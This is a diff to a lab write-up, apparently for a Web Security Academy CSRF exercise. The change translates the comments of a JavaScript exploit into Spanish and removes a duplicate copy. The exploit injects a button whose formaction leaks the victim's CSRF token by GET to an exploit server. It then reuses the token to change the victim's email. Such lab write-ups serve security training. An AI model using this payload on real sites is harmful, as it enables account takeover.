@@ -424,25 +424,26 @@ If clicking the button redirects to Google, the issue is confirmed. I used **GET
 
 The idea is to use `formaction` to hijack the form and `formmethod="get"` to force the CSRF token to be sent in the URL to the exploit server.
 
+```
 <body>
 <script>
 /**
- * STEP 1: Environment setup
+ * PASO 1: Configuración de Entorno
  */
-const academyFrontend = "https://your-lab-id.web-security-academy.net/";
-const exploitServer = "https://your-exploit-server-id.exploit-server.net/exploit";
+const academyFrontend = "https://tu-id-de-laboratorio.web-security-academy.net/";
+const exploitServer = "https://tu-id-de-exploit-server.exploit-server.net/exploit";
 
 /**
- * STEP 2: Loot extraction
- * Capture the CSRF token from the URL parameters.
+ * PASO 2: Extracción del botín
+ * Captura el token CSRF que llega como parámetro en la URL.
  */
 const url = new URL(location);
 const csrf = url.searchParams.get('csrf');
 
 if (csrf) {
     /**
-     * STEP 3: Attack execution (silent POST)
-     * Use the stolen token to change the victim’s email.
+     * PASO 3: Ejecución del Ataque (POST silencioso)
+     * Usa el token robado para cambiar el email de la víctima sin que se dé cuenta.
      */
     const form = document.createElement('form');
     form.method = 'post';
@@ -462,60 +463,14 @@ if (csrf) {
     form.submit();
 } else {
     /**
-     * STEP 0: The bait
-     * Redirect the victim to the vulnerable page with the injected button.
+     * PASO 0: El Cebo
+     * Redirige a la víctima a la página vulnerable e inyecta el botón malicioso.
      */
     location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
 }
 </script>
 </body>
 ```
-<body>
-<script>
-/**
- * STEP 1: Environment setup
- */
-const academyFrontend = "https://your-lab-id.web-security-academy.net/";
-const exploitServer = "https://your-exploit-server-id.exploit-server.net/exploit";
-
-/**
- * STEP 2: Loot extraction
- * Capture the CSRF token from the URL parameters.
- */
-const url = new URL(location);
-const csrf = url.searchParams.get('csrf');
-
-if (csrf) {
-    /**
-     * STEP 3: Attack execution (silent POST)
-     * Use the stolen token to change the victim’s email.
-     */
-    const form = document.createElement('form');
-    form.method = 'post';
-    form.action = `${academyFrontend}my-account/change-email`;
-
-    const email = document.createElement('input');
-    email.name = 'email';
-    email.value = 'hacker@evil-user.net';
-
-    const token = document.createElement('input');
-    token.name = 'csrf';
-    token.value = csrf;
-
-    form.append(email);
-    form.append(token);
-    document.documentElement.append(form);
-    form.submit();
-} else {
-    /**
-     * STEP 0: The bait
-     * Redirect the victim to the vulnerable page with the injected button.
-     */
-    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
-}
-</script>
-</body>
-
 
 ## Real-World Application
 
